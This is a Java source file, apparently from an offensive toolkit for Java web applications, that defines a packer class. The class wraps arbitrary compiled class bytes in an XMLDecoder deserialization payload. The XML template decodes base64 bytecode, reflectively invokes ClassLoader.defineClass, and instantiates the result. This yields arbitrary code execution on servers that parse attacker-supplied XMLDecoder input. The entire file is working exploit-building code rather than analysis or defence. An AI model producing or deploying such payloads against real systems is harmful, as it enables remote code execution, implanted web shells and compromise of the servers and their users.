package com.reajason.javaweb.packer.xmldecoder;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;

/**
 * @author ReaJason
 * @since 2025/7/22
 */
public class XMLDecoderDefineClassPacker implements Packer {
    String template = "<java>\n" +
            "    <object class=\"javax.xml.bind.DatatypeConverter\" method=\"parseBase64Binary\" id=\"code\">\n" +
            "        <string>{{base64Str}}></string>\n" +
            "    </object>\n" +
            "    <class id=\"clazz\">java.lang.ClassLoader</class>\n" +
            "    <void idref=\"clazz\">\n" +
            "        <void method=\"getDeclaredMethod\" id=\"defineClass\">\n" +
            "            <string>defineClass</string>\n" +
            "            <array class=\"java.lang.Class\" length=\"3\">\n" +
            "                <void index=\"0\"><class>[B</class></void>\n" +
            "                <void index=\"1\"><class>int</class></void>\n" +
            "                <void index=\"2\"><class>int</class></void>\n" +
            "            </array>\n" +
            "            <void method=\"setAccessible\"><boolean>true</boolean></void>\n" +
            "        </void>\n" +
            "    </void>\n" +
            "    <object method=\"invoke\" class=\"sun.reflect.misc.MethodUtil\">\n" +
            "        <object idref=\"defineClass\"/>\n" +
            "        <object class=\"java.lang.ClassLoader\" method=\"getSystemClassLoader\"/>\n" +
            "        <array class=\"java.lang.Object\" length=\"3\">\n" +
            "            <void index=\"0\"><object idref=\"code\"/></void>\n" +
            "            <void index=\"1\"><int>0</int></void>\n" +
            "            <void index=\"2\"><int>{{byteCodeLength}}</int></void>\n" +
            "        </array>\n" +
            "        <void method=\"newInstance\"/>\n" +
            "    </object>\n" +
            "</java>";

    @Override
    public String pack(ClassPackerConfig config) {
        return template
                .replace("{{base64Str}}", config.getClassBytesBase64Str())
                .replace("{{byteCodeLength}}", String.valueOf(config.getClassBytes().length));
    }
}
